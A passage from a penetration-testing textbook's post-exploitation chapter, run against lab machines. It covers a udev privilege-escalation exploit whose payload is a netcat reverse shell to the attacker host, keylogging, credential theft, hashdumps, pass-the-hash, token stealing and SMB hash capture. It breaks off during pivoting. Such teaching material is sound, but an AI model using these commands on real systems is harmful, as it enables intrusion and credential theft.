originate from the kernel. Processes in user space, such as ones\nthat a user starts, can send messages to udev and convince it to run code\nwith root privileges.\nAccording to the SecurityFocus.com entry for this vulnerability, Ubuntu\n\n8.10 is an affected platform, and further digging reveals that udev versions\n141 and earlier are affected by this issue. We can check the udev version on\nour target with the command udevadm --version, but we can’t run the com-\nmand with the privileges afforded by www-data. Instead, we need to run it\nfrom our SSH shell as shown here.\ngeorgia@ubuntu:~$ udevadm --version\n124\nThe udev version on our target, 124, is earlier than 141, which tells us\nthat our Linux target is vulnerable.\nFinding an Exploit\nKali Linux includes a local repository of public exploit code from Exploitdb\n.com at /usr/share/exploitdb, which includes a utility called searchsploit that\nwe can use to search for useful code. For example, Listing 13-13 shows the\nresults of a search for exploits related to udev.\nroot@kali:~# /usr/share/exploitdb/searchsploit udev\nDescription Path\n---------------------------------------------------------------------- ----------------------\nLinux Kernel 2.6 UDEV Local Privilege Escalation Exploit /linux/local/8478.sh\nLinux Kernel 2.6 UDEV < 141 Local Privilege Escalation Exploit /linux/local/8572.c\nLinux udev Netlink Local Privilege Escalation /linux/local/21848.rb\nListing 13-13: Searching the Exploitdb repository\nThere appear to be multiple public exploits for this issue. Let’s use the\nsecond exploit, /usr/share/exploitdb/platforms/linux/local/8572.c.\nnote Always be sure that you fully understand what public exploit code does before running\nit against a target. Additionally, there is always a chance that a public exploit won’t\nrun reliably on the target. If possible, set up a lab machine, and test the quality of the\nexploit before you try it on the client target.\nOne of the great things about this exploit is that it’s well commented\nand provides detailed usage information. Listing 13-14 shows an excerpt\nfrom its C code, which includes usage details.\n288 Chapter 13\n* Usage:\n* Pass the PID of the udevd netlink socket (listed in /proc/net/netlink,\n* usually is the udevd PID minus 1) as argv[1].\n* The exploit will execute /tmp/run as root so throw whatever payload you\n* want in there.\nListing 13-14: Udev exploit usage information\nWe learn that we need to pass the PID of the udev netlink socket as an\nargument to our exploit. The usage information tells us to look for this\nvalue in /proc/net/netlink, usually as udev PID minus 1. We also see that the\nexploit will run whatever code it finds in the file /tmp/run as root, so we\nneed to put some code there.\nCopying and Compiling the Exploit on the Target\nFirst we need to copy the exploit to our target and compile it so that it can\nrun. Luckily, the GCC C compiler is preinstalled on most Linux distribu-\ntions, so you can often compile local exploit code directly on the target. To\nfind out if GCC is installed, enter gcc as shown here.\ngeorgia@ubuntu:~$ gcc\ngcc: no input files\nAs you can see, GCC complains that it’s not been given any input, but\nthis tells us that GCC is present. Now to copy our exploit code to the Linux\ntarget. The Linux wget command lets us use the command line to pull a\nfile down from a web server, so let’s copy the C code to our Kali Linux web\nserver as shown here. Make sure the apache2 webserver is running in Kali.\nroot@kali:~# cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www\nNow switch to your SSH shell, and download the file with wget, as shown\nin Listing 13-15.\ngeorgia@ubuntu:~$ wget http://192.168.20.9/8572.c\n--2015-08-14 14:30:51-- http://192.168.20.9/8572.c\nConnecting to 10.0.1.24:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2768 (2.7K) [text/x-csrc]\nSaving to: `8572.c'\n100%[======================================>] 2,768 --.-K/s in 0s\n2015-08-14 14:30:52 (271 MB/s) - `8572.c' saved [2768/2768]\nListing 13-15: Using wget to download a file\nNow compile the exploit code with GCC on the Linux target as shown\nhere. Use the -o flag to specify an output file name for your compiled code.\nPost Exploitation 289\ngeorgia@ubuntu:~$ gcc -o exploit 8572.c\nNow to find that udev netlink socket PID mentioned in the exploit’s\nusage information (Listing 13-14) for our argument. The usage informa-\ntion noted that the PID we need is listed in /proc/net/netlink. cat out the file,\nas shown in Listing 13-16.\ngeorgia@ubuntu:~$ cat /proc/net/netlink\nsk Eth Pid Groups Rmem Wmem Dump Locks\nf7a90e00 0 5574 00000111 0 0 00000000 2\nda714400 0 6476 00000001 0 0 00000000 2\nda714c00 0 4200780 00000000 0 0 00000000 2\n--snip--\nf7842e00 15 2468 00000001 0 0 00000000 2\nf75d5c00 16 0 00000000 0 0 00000000 2\nf780f600 18 0 00000000 0 0 00000000 2\nListing 13-16: The /proc/net/netlink file\nThere’s more than one PID listed, but we know that the PID we need is\nusually the PID of the udev daemon minus 1. Look at the udev process with\nthe ps aux command, as shown here.\ngeorgia@ubuntu:~$ ps aux | grep udev\nroot 2469 0.0 0.0 2452 980 ? S<s 02:27 0:00 /sbin/udevd --daemon\ngeorgia 3751 0.0 0.0 3236 792 pts/1 S+ 14:36 0:00 grep udev\nThe udev daemon’s PID is 2469. One of the PIDs from Listing 13-16 is\n2468 (udev’s PID minus 1). Based on the exploit’s help information, this\nis the value we need. This value is going to change between reboots of the\nUbuntu target, so make sure you run these commands in your own lab to\nfind the correct value.\nadding Code to the /tmp/run File\nThe last thing we need is some code to be run as root in the file /tmp/run.\nLuckily, we also have Netcat installed on our Ubuntu system by default, so\nwe can create a simple Bash script to connect back to a listener on our Kali\nsystem, as discussed in Chapter 2. Here’s the script.\ngeorgia@ubuntu:~$ cat /tmp/run\n#!/bin/bash\nnc 192.168.20.9 12345 -e /bin/bash\nBefore running our exploit, we need to set up a listener on our Kali sys-\ntem to catch the incoming Netcat shell.\nroot@kali:~# nc -lvp 12345\nlistening on [any] 12345 ...\n290 Chapter 13\nFinally, we’re ready to run our compiled exploit. Remember to pass the\nPID of the udev netlink socket we found earlier as an argument.\ngeorgia@ubuntu:~$ ./exploit 2468\nNothing seems to happen on the Linux target, but if you turn back to\nthe Netcat listener on Kali, we have a connection. The whoami command tells\nus we now have root privileges, as shown in Listing 13-17.\nroot@kali:~# nc -lvp 12345\nlistening on [any] 12345 ...\n\n192.168.20.11: inverse host lookup failed: Unknown server error : Connection\ntimed out\nconnect to [192.168.20.9] from (UNKNOWN) [192.168.20.11] 33191\nwhoami\nroot\nListing 13-17: Gaining root privileges\nWe’ve successfully escalated our privileges using a public exploit. Local information gathering\nOnce we gain access to a system we should see if any potentially sensitive\ninformation is present, such as installed software that stores passwords in\nplaintext or using a weak hashing algorithm, proprietary data or source\ncode, customer credit card information, or the CEO’s email account. These\nare all useful bits of information to present in the final report to the cus-\ntomer. Additionally, any information we find may help us break into other\nsystems in the network that hold even greater spoils. We will look at moving from system to system later in this chapter, but for\nnow let’s look at a few interesting ways to find information on the local system. Searching for Files\nWe can tell Meterpreter to search for interesting files. For example in\nListing 13-18, I tell Meterpreter to look for any filenames that contain the\nname password. meterpreter > search -f *password*\nFound 8 results... c:\\\\WINDOWS\\Help\\password.chm (21891 bytes)\nc:\\\\xampp\\passwords.txt (362 bytes)\nc:\\\\xampp\\php\\PEAR\\Zend\\Dojo\\Form\\Element\\PasswordTextBox.php (1446 bytes)\nc:\\\\xampp\\php\\PEAR\\Zend\\Dojo\\View\\Helper\\PasswordTextBox.php (1869 bytes)\nc:\\\\xampp\\php\\PEAR\\Zend\\Form\\Element\\Password.php (2383 bytes)\nc:\\\\xampp\\php\\PEAR\\Zend\\View\\Helper\\FormPassword.php (2942 bytes)\nc:\\\\xampp\\phpMyAdmin\\user_password.php (4622 bytes)\nc:\\\\xampp\\phpMyAdmin\\libraries\\display_change_password.lib.php (3467 bytes)\nListing 13-18: Using Meterpreter to look for files\nPost Exploitation 291\nKeylogging\nAnother way to gather information is to let the logged-in user give it to you,\nso to speak. Meterpreter has a keylogger we can use to listen for keystrokes. Perhaps the user is logging in to websites or other systems on the network\nwhile our Meterpreter session is active. Start the keylogger on the Windows XP\nMeterpreter session by entering keyscan_start, as shown here. meterpreter > keyscan_start\nStarting the keystroke sniffer... note You will capture keystrokes only in your current context. For my example, I used my\noriginal Windows XP session where I am the user georgia in the explorer.exe pro-\ncess, and thus can sniff georgia’s keystrokes. Another interesting idea is to migrate\ninto the winlogon process, where you will see only login information that is typed—\ncertainly useful information. Now switch to Windows XP, and type something. In my example I typed\nctrl-R to open the Run dialog. Then I entered notepad.exe to start the\nNotepad program and typed hi georgia into Notepad. To see any keystrokes the keylogger has logged, enter keyscan_dump as\nshown here. As you can see, all of the keystrokes I typed were logged. meterpreter > keyscan_dump\nDumping captured keystrokes... <LWin> notepad.exe <Return> hi georgia <Return>\nTo stop the keylogger, enter keyscan_stop in Meterpreter as shown here. meterpreter > keyscan_stop\nStopping the keystroke sniffer... Gathering Credentials\nIn Chapter 9, we worked with password hashes from Windows, Linux, and\nthe FileZilla FTP server, but users may have other stored credentials on\ntheir local system. Metasploit has several post modules for gathering pass-\nwords for specific software in /usr/share/metasploit-framework/modules/post/\nwindows/gather/credentials. For our example, we will look at stealing stored\ncredentials from WinSCP, a secure copy tool for Windows. As shown in Figure 13-1, open WinSCP, set the File protocol to SCP, the\nHost name to the IP address of the Ubuntu target, and the credentials to\ngeorgia:password. Click Save As under the login information. 292 Chapter 13\nFigure 13-1: Connecting with WinSCP\nnote Like some of the other tools used in this book, the WinSCP GUI may be updated in the\nfuture, so your version may not look exactly like this. You will be prompted for a session name, as shown in Figure 13-2. Check\nthe Save password box before clicking OK. Even WinSCP warns you that\nsaving passwords is a bad idea. Figure 13-2: Saving credentials in WinSCP\nPost Exploitation 293\nNow switch back to Kali Linux, and use the module post/windows/gather/\ncredentials/winscp, as shown in Listing 13-19. Because this is a post module,\nthe only option you will need to supply is the ID of the Windows XP session. msf > use post/windows/gather/credentials/winscp\nmsf post(winscp) > show options\nModule options (post/windows/gather/credentials/winscp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSESSION yes The session to run this module on. msf post(winscp) > set session 1\nsession => 1\nmsf post(winscp) > exploit\n[*] Looking for WinSCP.ini file storage... [*] WinSCP.ini file NOT found... [*] Looking for Registry Storage... [*] Host: 192.168.20.9 Port: 22 Protocol: SSH Username: georgia Password: password u\n[*] Done! [*] Post module execution completed\nListing 13-19: Stealing stored credentials from WinSCP\nAs shown in Listing 13-19, the module discovers our saved credentials u. Based on the software your pentesting targets are running, there may be\nother credential-gathering targets that will come in handy in the field. net Commands\nThe Windows net command will allow us to view and edit network infor-\nmation. Using various options, we can gain valuable information. Drop\nto a Windows command shell using the Meterpreter command shell, as\nshown here. meterpreter > shell\n--snip--\nCopyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>\nThe command net users will show us all local users. Tacking on the\nword /domain at the end of this and many net commands will show informa-\ntion about the domain rather than the local system, but because our targets\nare not joined to a domain, we’ll stick with net users. C:\\Windows\\system32> net users\nnet users\nUser accounts for \\\\\n------------------------------------------------------------------------------\nAdministrator georgia secret Guest\n294 Chapter 13\nWe can also see the members of a group with the command net\nlocalgroup group as shown in Listing 13-20. C:\\Windows\\system32> net localgroup Administrators\nnet localgroup Administrators\nAlias name Administrators\nComment Administrators have complete and unrestricted access to the computer/domain\nMembers\n-----------------------------------------------------------------------------------------------\nAdministrator\ngeorgia\nsecret\nThe command completed successfully. Listing 13-20: Viewing local administrators with net commands\nTo exit the shell and drop back into Meterpreter, type exit. These are just a couple of examples of useful net commands. We’ll look\nat using net commands to add a user later in this chapter. Another Way In\nIn Chapter 5, we used Nmap to run a UDP scan. By definition, UDP scans\nare not as exact as TCP scans. For example, port 69/UDP on the Windows XP\ntarget, traditionally the port for TFTP, returned open|filtered in our UDP\nNmap scan. Because our scan did not receive any response, it was unclear if\nanything was listening there at all. Short of fuzzing the TFTP server and pos-\nsibly crashing it, it would be difficult to ascertain which TFTP software, if any,\nis running. Now that we have access to the system, we can further investigate\nrunning software for any vulnerabilities we may have missed. note Earlier in the chapter we used the Meterpreter ps command to view all running pro-\ncesses on the Windows XP target. One of these is 3CTftpSvc.exe, an older version\nof the 3Com TFTP service that is subject to a buffer overflow condition in the TFTP\nlong transport mode. (We’ll write an exploit for this issue by hand in Chapter 19, but\nthere’s a Metasploit module for this issue as well.) Though it would be difficult for an\nattacker to identify this issue remotely, the software is still vulnerable, and we should\ninclude it in our pentest report. It may be that you won’t discover a network-facing vulnerability until\nafter you have gained access to the system. Without sending random TFTP\ninput to the server and analyzing the results, it would be difficult for us to\nfind this issue. Checking Bash History\nOne place to look for potentially interesting information on a Linux system\nis in a user’s Bash history. When a Bash shell is closed, the commands that\nhave been executed are written to a file called .bash_history in the user’s\nPost Exploitation 295\nhome directory. A perhaps rather contrived example where the user’s pass-\nword is saved in plaintext in the Bash history file is shown here. georgia@ubuntu:~$ cat .bash_history\nmy password is password\n--snip--\nLateral movement\nOnce we have access to one system in a networked environment, can we use\nit to access additional systems and their sensitive data? If our exploited sys-\ntem is a member of a domain, we can certainly try to compromise a domain\naccount or ideally get domain administrator access so that we can log in to\nand manage all systems in the domain. But even if you can’t get control of a domain, you may still be able to\naccess the systems in that domain if they were all installed from the same\nsystem install image with the same local administrator password that has\nnever been changed. If we can crack this password for one machine, we may\nbe able to log in to many machines in the environment without domain\naccess. Also, if a user has an account on multiple systems, he or she may\nuse the same password on each system, which might allow us to log in with\ncredentials we found elsewhere in the environment. (Good password poli-\ncies help prevent these kinds of vulnerabilities, but passwords are often the\nweakest link, even in high-security environments.)\nLet’s look at a few techniques for turning access to one system into\naccess to many. PSExec\nThe PSExec technique originated in the Sysinternals Windows manage-\nment tool set in the late 1990s. The utility worked by using valid credentials\nto connect to the ADMIN$ share on the Windows XP SMB server. PSExec\nuploads a Windows service executable to the ADMIN$ share and then con-\nnects to the Windows Service Control Manager using remote procedure\ncall (RPC) to start the executable service. The service then sets up an SMB\nnamed pipe to send commands and remotely control the target system. The Metasploit module exploit/windows/smb/psexec implements a very\nsimilar technique. The module requires a running SMB server on the tar-\nget and credentials that give access to the ADMIN$ share. In Chapter 9, we cracked the password hashes for users on our\nWindows XP target. You can probably imagine using the found creden-\ntials and PSExec to gain access to additional systems. Use the credentials\ngeorgia:password with the PSExec module, as shown in Listing 13-21. msf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > show options\nModule options (exploit/windows/smb/psexec):\n296 Chapter 13\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 445 yes Set the SMB service port\nSHARE ADMIN$ yes The share to connect to, can be an admin share\n(ADMIN$,C$,...) or a normal read/write folder share\nSMBDomain WORKGROUP no The Windows domain to use for authentication\nSMBPass no The password for the specified username\nSMBUser no The username to authenticate as\nmsf exploit(psexec) > set RHOST 192.168.20.10\nRHOST => 10.0.1.13\nmsf exploit(psexec) > set SMBUser georgiau\nSMBUser => georgia\nmsf exploit(psexec) > set SMBPass passwordv\nSMBPass => password\nmsf exploit(psexec) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Connecting to the server... [*] Authenticating to 192.168.20.10:445|WORKGROUP as user 'georgia'... [*] Uploading payload... [*] Created \\KoMknErc.exe...\n\n--snip--\n[*] Meterpreter session 6 opened (192.168.20.9:4444 -> 192.168.20.10:1173) at 2015-08-14\n14:13:40 -0400\nListing 13-21: Using the PSExec module\nIn addition to RHOST, we need to tell the module which SMBDomain,\nSMBUser, and SMBPass to use. Our Windows XP target is not a mem-\nber of a domain, so we can leave the SMBDomain option at the default,\n\nWORKGROUP. Set SMBUser to georgia u and SMBPass to password v, our discovered\ncredentials. Then run the exploit module. The module embeds the chosen\npayload (in this case, the default windows/meterpreter/reverse_tcp) into a\nWindows service image executable. After uploading the executable and con-\ntacting Windows Service Control Manager, the service copies the shellcode\ninto executable memory for the service process and redirects execution to\nthe payload. Thus our payload runs and connects back to our Metasploit\nlistener on Kali. Even though we logged on as the user georgia, because our\npayload is running as a system service, our session automatically has system\nprivileges. note This is why we made the change to the Windows XP Security Policy in Chapter 1. If\nWindows XP were a member of a domain, we could fill in the SMBDomain option\nand use PSExec to get System access on any system where the domain user was a local\nadministrator. This is a great way to move around a network looking for interesting\ninformation, additional password hashes, and more vulnerabilities. Post Exploitation 297\nPass the Hash\nOur previous attack relied on our ability to reverse the password hash and\ngain access to the plaintext password for a user account. Of course, in the\ncase of our Windows XP target, this is trivial because it uses the entirely\ncrackable LM hashing algorithm. In Chapter 9, we learned that when we have only the NTLM user\nauthentication hash of a password, instead of the weaker LM version, our\nability to reverse the hash in a reasonable amount of time depends on the\nweakness of the password, the strength of our wordlist, and even the algo-\nrithms employed by the password-cracking program. If we can’t reverse the\npassword hash, we’re going to have a tough time logging in to other systems\nwith the plaintext credentials. PSExec comes to the rescue again. When a user logs in over SMB, his or\nher password is not sent to the target in plaintext. Instead, the target system\nissues a challenge that can be answered only by someone with the correct\npassword. In this case, the answer to the challenge is the LM- or NTLM-\nhashed password, depending on the implementation. When you log in to a remote system, your Windows application calls\na utility to hash the password, and that hash is sent to the remote system\nfor authentication. The remote system assumes that if you send the correct\nhash, you must have access to the correct plaintext password—that is, after\nall, one of the fundamentals of one-way hash functions. Can you think of a\nscenario where you might have access to password hashes but not the plain-\ntext passwords? In Chapter 9, we were able to reverse all password hashes on our target\nsystems. Additionally, on our Windows XP target, we were able to reverse\nthe LM hashes regardless of the strength of the password. But let’s simu-\nlate a situation where we have only password hashes, as shown with the\nMeterpreter hashdump command in Listing 13-22. meterpreter > hashdump\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\ngeorgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:93880b42019f250cd197b67718ac9a3d:86da9cefbdedaf62b66d9b2fe8816c1f:::\nsecret:1004:e52cac67419a9a22e1c7c53891cb0efa:9bff06fe611486579fb74037890fda96:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:6f552ba8b5c6198ba826d459344ceb14:::\nListing 13-22: Using hashdump\nnote When using the hashdump Meterpreter command against newer Windows operating\nsystems, you may find that it fails. An alternative is the post module: post/windows/\ngather/hashdump. There is even post/windows/gather/smart_hashdump,\nwhich can not only gather local hashes but also active directory hashes if you have\nexploited a domain controller. So if at first you don’t succeed in dumping password\nhashes on a pentest, explore additional options. 298 Chapter 13\nLet’s use the Metasploit PSExec module to take advantage of how SMB\nauthenticates and a technique called Pass the Hash. Instead of setting the\nSMBPass option to georgia’s password, copy in the LM and NTLM hashes for\ngeorgia from the hashdump in Listing 13-23 as the SMBPass option. msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nSMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nmsf exploit(psexec) > exploit\n--snip--\n[*] Meterpreter session 7 opened (192.168.20.9:4444 -> 192.168.20.10:1233) at 2015-08-14 14:17:47\n-0400\nListing 13-23: PSExec Pass the Hash\nAgain we’re able to use PSExec to get a Meterpreter session. Even\nwithout knowing the plaintext password, the password hash alone can be\nenough to get access to other systems in the environment using PSExec. SSHExec\nLike PSExec for Windows, we can use SSHExec to move through an envi-\nronment’s Linux systems if we have even one set of valid credentials, which\nare likely to work elsewhere in the environment. The Metasploit module\nmulti/ssh/sshexec and its options are shown in Listing 13-24. msf > use exploit/multi/ssh/sshexec\nmsf exploit(sshexec) > show options\nModule options (exploit/multi/ssh/sshexec):\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASSWORD yes The password to authenticate with. RHOST yes The target address\nRPORT 22 yes The target port\nUSERNAME root yes The user to authenticate as. --snip--\nmsf exploit(sshexec) > set RHOST 192.168.20.11\nRHOST => 192.168.20.11\nmsf exploit(sshexec) > set USERNAME georgiau\nUSERNAME => georgia\nmsf exploit(sshexec) > set PASSWORD passwordv\nPASSWORD => password\nmsf exploit(sshexec) > show payloads\n--snip--\nlinux/x86/meterpreter/reverse_tcp normal Linux Meterpreter, Reverse TCP\nStager\n--snip--\nmsf exploit(sshexec) > set payload linux/x86/meterpreter/reverse_tcp\npayload => linux/x86/meterpreter/reverse_tcp\nmsf exploit(sshexec) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(sshexec) > exploit\nPost Exploitation 299\n[*] Started reverse handler on 192.168.20.9:4444\n--snip--\n[*] Meterpreter session 10 opened (192.168.20.9:4444 -> 192.168.20.11:36154)\nat 2015-03-25 13:43:26 -0400\nmeterpreter > getuid\nServer username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000,\nsgid=1000\nmeterpreter > shell\nProcess 21880 created. Channel 1 created. whoami\ngeorgia\nListing 13-24: Using SSHExec\nIn this example, we know the credentials georgia:password from having\ncracked them in Chapter 9. Although in this case we will just be logging into\nthe same host again (similar to what we did in “PSExec” on page 296), we\ncould use this same technique on other hosts in that same environment\nthat have an account for georgia. As with PSExec, we need valid credentials in order to authenticate. We\nset the USERNAME to georgia u and PASSWORD to password v, and then choose\nlinux/x86/meterpreter/reverse_tcp as the payload. Unlike with PSExec (which uploaded a binary and ran it as a System\nservice, automatically giving us System privileges), with SSHExec we are\nstill user georgia. You can see how this exploit could prove to be a quick way\nto move around an environment in search of additional information and\nvulnerabilities on other Linux systems. Token Impersonation\nNow that we know we might not even need plaintext passwords to gain\naccess to other systems, is there any case where we may not even need the\npassword hashes? One interesting Windows security construct is the concept of tokens. Tokens are primarily used for access control. Based on the token of a pro-\ncess, the operating system can make decisions about which resources and\noperations should be made available to it. Think of a token as a kind of temporary key that gives you access to\ncertain resources without having to enter your password every time you\nwant to perform a privileged operation. When a user logs in to the system\ninteractively, such as directly through the console or from a remote desktop,\na delegation token is created. Delegation tokens allow the process to impersonate the token on the\nlocal system as well as on the network, for example on other systems in a\ndomain. Delegation tokens contain credentials and can be used to authen-\nticate with other systems that use these credentials, such as the domain\ncontroller. Tokens persist until reboot, and even if a user logs out, his or her\n300 Chapter 13\ntoken will still be present on the system until it shuts down. If we can steal\nanother token on the system, we can potentially gain additional privileges\nand even access to additional systems. Incognito\nWe’re on a compromised system: our Windows XP target. Which tokens are\non the system, and how do we steal them? Incognito was originally a stand-\nalone tool developed by security researchers conducting research into using\ntoken stealing for privilege escalation, but it has since been added as an\nextension to Meterpreter. Incognito will help us enumerate and steal all the\ntokens on a system. Incognito is not loaded into Meterpreter by default, but we can add it\nwith the load command, as shown here. Use one of your Meterpreter sessions\ncurrently running as system, or use privilege escalation to elevate your access. (System has access to all tokens on the target.)\nmeterpreter > load incognito\nLoading extension incognito...success. Before we use Incognito, switch users on your Windows XP target and\nlog in as secret with the password Password123. This login will create a delega-\ntion token on the target for us to impersonate. As we list tokens, Incognito\nsearches all handles on the system to determine which ones belong to tokens\nusing low-level Windows API calls. To see all the user tokens available with\nthe Meterpreter Incognito, enter the command list_tokens -u as shown in\nListing 13-25. meterpreter > list_tokens -u\nDelegation Tokens Available\n========================================\nBOOKXP\\georgia\nBOOKXP\\secret\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nListing 13-25: Enumerating tokens with Incognito\nWe see tokens for both georgia and secret. Let’s try stealing secret’s\ndelegation token, effectively gaining the privileges of this user. Use the\nimpersonate_token command to steal the token, as shown in Listing 13-26.\n\n(Note that we use two backslashes to escape the backslash between the\ndomain—in this case, the local machine name—and the username.)\nmeterpreter > impersonate_token BOOKXP\\\\secret\n[+] Delegation token available\n[+] Successfully impersonated user BOOKXP\\secret\nPost Exploitation 301\nmeterpreter > getuid\nServer username: BOOKXP\\secret\nListing 13-26: Stealing a token with Incognito\nHaving stolen secret’s token, if we run getuid we should see that we are\neffectively now the user secret. This can be especially interesting when in a\ndomain: If secret is a domain administrator, we are now a domain adminis-\ntrator as well, and we can do things like create a new domain administrator\naccount or change the domain administrator’s password. (We’ll look at how\nto add accounts from the command line in “Persistence” on page 309.)\nSMB Capture\nLet’s look at one more interesting consequence of token stealing. In a\ndomain, password hashes for domain users are stored only on the domain\ncontroller, which means that running a hashdump on an exploited system\nwill give us password hashes only for local users. We don’t have a domain\nset up, so secret’s password hash is stored locally, but imagine that secret is\ninstead a domain user. Let’s look at a way of capturing the password hashes\nwithout gaining access to the domain controller by passing the hash to an\nSMB server we control and recording the results. Open a second instance of Msfconsole, and use the module auxiliary/\nserver/capture/smb to set up an SMB server and capture any authentication\nattempts. Like the client-side attack modules we studied in Chapter 10, this\nmodule does not directly attack another system; it just sets up a server and\nwaits. Set up the module options as shown in Listing 13-27. msf > use auxiliary/server/capture/smb\nmsf auxiliary(smb) > show options\nModule options (auxiliary/server/capture/smb):\nName Current Setting Required Description\n---- --------------- -------- -----------\nCAINPWFILE no The local filename to store the hashes in Cain&Abel\nformat\nCHALLENGE 1122334455667788 yes The 8 byte challenge\nJOHNPWFILE no The prefix to the local filename to store the hashes\nin JOHN format\nSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address\non the local machine or 0.0.0.0\nSRVPORT 445 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections\nSSLCert no Path to a custom SSL certificate (default is\nrandomly generated)\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nmsf auxiliary(smb) > set JOHNPWFILE /root/johnfileu\nJOHNPWFILE => johnfile\nmsf auxiliary(smb) > exploit\nListing 13-27: Using the SMB capture module\n302 Chapter 13\nYou can save the results to a CAINPWFILE or a JOHNPWFILE, which\nwill save the captured hashes in the formats expected by the Cain and\nAbel password tool for Windows and John the Ripper, respectively. Let’s\nset it to JOHNPWFILE u because we learned how to use John in Chapter 9. Now return to your Meterpreter session where you impersonated secret’s\ntoken in the previous section, and drop to a shell, as shown next. Because\nwe’ve stolen secret’s token, this shell should be running as secret. Knowing\nthat delegation tokens include credentials to authenticate with other sys-\ntems, we’ll use the net use Windows command to attempt to authenticate\nwith our fake SMB capture server. Connect to any share you like on the Kali SMB server. The login will\nfail, but the damage will be done. meterpreter > shell\nC:\\Documents and Settings\\secret>net use \\\\192.168.20.9\\blah\nReturning to your SMB Capture Msfconsole window, you should see\nthat you’ve captured a set of password hashes. [*] SMB Captured - 2015-08-14 15:11:16 -0400\nNTLMv1 Response Captured from 192.168.20.10:1078 – 192.168.20.10\nUSER:secret DOMAIN:BOOKXP OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1\nLMHASH:76365e2d142b5612338deca26aaee2a5d6f3460500532424\nNTHASH:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c\nnote This exercise can be a bit flaky, particularly without a Windows domain present. You\nmight have trouble capturing the hash and instead get something like this:\n[*] SMB Capture - Empty hash captured from 192.168.20.10:1050 - 192.168.20.10\ncaptured, ignoring ... This is a common issue. Just try to understand the concepts so you can try them in\nclient environments where Windows domains are deployed. The results are saved in the proper format in the JOHNPWFILE\nMetasploit module option for auxiliary/server/capture/smb. For example,\nsince we set our JOHNPWFILE as /root/johnfile, the file to feed into John is\n/root/johnfile_netntlm. When you compare the hashes to those dumped with\nhashdump in Listing 13-22, you’ll see that the hashes for secret differ. What’s\ngoing on? As it turns out, these hashes are for NETLM and NETNTLM,\nwhich are a bit different than the regular LM and NTLM Windows hashes\nwe worked with in Chapter 9. And when you look at the JOHNPWFILE, you’ll\nsee that its format is a bit different from what we’ve seen previously with\nJohn the Ripper. secret::BOOKXP:76365e2d142b5612338deca26aaee2a5d6f3460500532424:f2148557db0456\n441e57ce35d83bd0a27fb71fc8913aa21c:1122334455667788\nPost Exploitation 303\nIn particular, the hash entry has taken note of the CHALLENGE option set\nin Metasploit. Though the user secret has a local hash on our Windows XP\ntarget that would save us the trouble of cracking NETLM and NETNTLM\nhashes, this is a useful trick for grabbing password hashes when working\nwith domain user accounts, which store their password hashes only on the\ndomain controllers. Pivoting\nNow let’s see if we can use access to a system to gain access to another net-\nwork entirely. Typically an organization has only a few Internet-facing sys-\ntems—hosting services that need to be made available to the Internet such\nas web servers, email, VPNs, and so on. These services may be hosted by a\nprovider such as Google or GoDaddy, or they may be hosted in house. If\nthey are hosted in house, gaining access to them from the Internet may give\nyou access to the internal network. Ideally their internal network will be seg-\nmented by business unit, level of sensitivity, and so on, such that access to one\nmachine does not give direct network access to all machines in the enterprise. note Internet-facing systems may be dual homed, or a member of multiple networks, namely\nthe Internet and an internal network. A security best practice is to keep dual-homed\nsystems segregated from sensitive internal network resources in a demilitarized zone,\nbut I have performed penetration tests for clients who have Internet-facing systems as\npart of their internal domain. All I had to do was exploit their web application, which\nhad a default password for the administrative account, and upload a PHP shell as we\ndid to XAMPP in Chapter 8, and suddenly I had access to a system on their internal\ndomain. Hopefully, most of your clients will require a few more steps between piercing\nthe perimeter and domain access. When we set up our Windows 7 target in Chapter 1, we gave it two virtual\nnetwork adapters. We connected one to the bridged network where it could\ntalk to the other targets and our Kali virtual machine. The other virtual\nadapter is connected to the host-only network. For this exercise, switch the\nWindows XP target to the host-only network so it is no longer accessible by\nthe Kali system. (For more information on changing virtual network settings,\nsee “Creating the Windows 7 Target” on page 48.)\nThough this is a Windows system, Meterpreter allows us to use the\nifconfig command to see networking information. As shown in Listing 13-28,\nthe Windows 7 target is part of two networks: the 192.168.20.0/24 network,\nwhich also includes our Kali system, and the 172.16.85.0/24 network, which\nour Kali system does not have access to. meterpreter > ifconfig\nInterface 11\n============\nName : Intel(R) PRO/1000 MT Network Connection\nHardware MAC : 00:0c:29:62:d5:c8\n\nMTU : 1500\nIPv4 Address : 192.168.20.12\n304 Chapter 13\nIPv4 Netmask : 255.255.255.0\nInterface 23\n============\nName : Intel(R) PRO/1000 MT Network Connection #2\nHardware MAC : 00:0c:29:62:d5:d2\n\nMTU : 1500\nIPv4 Address : 172.16.85.191\nIPv4 Netmask : 255.255.255.0\nListing 13-28: Dual-homed system networking information\nWe can’t attack any systems in the 172.16.85.0 network directly from\nKali. However, because we have access to the Windows 7 target, we can use\nit as a jumping-off point, or pivot, to further explore this second network, as\nshown in Figure 13-3.\nKali Windows 7\n\n192.168.20.9 192.168.20.12\n\n172.16.85.191\nWindows XP\n\n172.16.85.190\nFigure 13-3: Pivoting through an 